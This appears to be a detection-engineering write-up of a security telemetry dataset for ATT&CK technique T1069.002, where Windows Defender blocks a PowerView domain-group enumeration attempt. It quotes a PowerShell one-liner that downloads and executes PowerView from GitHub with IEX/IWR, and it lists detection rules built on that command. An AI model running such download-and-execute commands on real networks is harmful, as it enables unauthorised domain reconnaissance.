# T1069.002-13: Domain Groups — Get-DomainGroup with PowerView

## Technique Context

T1069.002 (Domain Groups) represents adversary attempts to enumerate Active Directory groups to understand privilege structures, group memberships, and potential attack paths within a domain environment. This technique is fundamental to post-exploitation reconnaissance, helping attackers identify high-privilege groups like Domain Admins, Enterprise Admins, or custom administrative groups that could facilitate lateral movement or privilege escalation.

PowerView's Get-DomainGroup function is a popular tool for this enumeration, offering comprehensive group discovery capabilities beyond native Windows utilities. Detection teams focus on identifying PowerShell execution patterns, LDAP queries against domain controllers, and the characteristic network traffic and authentication patterns associated with Active Directory enumeration tools.

## What This Dataset Contains

The dataset captures a PowerView-based domain group enumeration attempt that was blocked by Windows Defender. The primary evidence includes:

**Security Event 4688** shows the PowerShell process creation with the full command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose}`

**Security Event 4689** records the PowerShell process termination with exit status `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution before the PowerView script could perform domain enumeration.

**Sysmon Event 1** captures the whoami.exe execution (`C:\Windows\system32\whoami.exe`) as part of the test framework, showing system-level execution context.

**Multiple Sysmon Event 7** entries document DLL loads including Windows Defender components (MpClient.dll, MpOAV.dll), .NET Framework libraries, and PowerShell automation modules, demonstrating the execution environment before blocking occurred.

**Sysmon Events 10 and 8** show process access and thread creation activities between PowerShell processes, indicating the script execution infrastructure was established before termination.

## What This Dataset Does Not Contain

The dataset lacks the actual domain group enumeration telemetry because Windows Defender terminated the PowerShell process before PowerView could execute its LDAP queries. Consequently, there are no:
- Domain controller authentication events (4768/4769)
- LDAP query logs showing group enumeration attempts  
- Network connections to domain controllers on port 389/636
- PowerShell script block logs of the actual Get-DomainGroup execution
- Active Directory object access events
- DNS queries for domain controller resolution

The PowerShell operational logs contain only test framework boilerplate (`Set-StrictMode`, `Set-ExecutionPolicy Bypass`) rather than the substantive PowerView script content, as execution was halted during the initial download phase.

## Assessment

This dataset provides excellent evidence of PowerView download attempts but limited insight into actual domain group enumeration behavior due to Defender's intervention. The telemetry effectively demonstrates endpoint protection blocking capabilities and the command-line artifacts left by failed PowerView deployment attempts.

For detection engineering focused on PowerView prevention, this data is valuable for building rules around the download patterns and initial execution indicators. However, for understanding post-execution enumeration behaviors, network signatures, or Active Directory query patterns, the dataset's utility is constrained by the early termination.

## Detection Opportunities Present in This Data

1. **PowerView Download Pattern Detection** - Monitor for PowerShell processes with command lines containing `IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'` indicating PowerView download attempts

2. **PowerShell Process Termination with ACCESS_DENIED** - Alert on Security 4689 events where powershell.exe processes exit with status 0xC0000022, suggesting security tool intervention

3. **Suspicious PowerShell Command Line Arguments** - Detect PowerShell executions with combined TLS protocol manipulation, web requests to known offensive repositories, and PowerView function calls in a single command line

4. **Process Access Pattern Anomalies** - Monitor Sysmon 10 events showing PowerShell processes accessing whoami.exe with full access rights (0x1FFFFF) as potential reconnaissance preparation

5. **Windows Defender DLL Loading in PowerShell Context** - Track Sysmon 7 events showing MpClient.dll and MpOAV.dll loads within PowerShell processes as indicators of security scanning activity
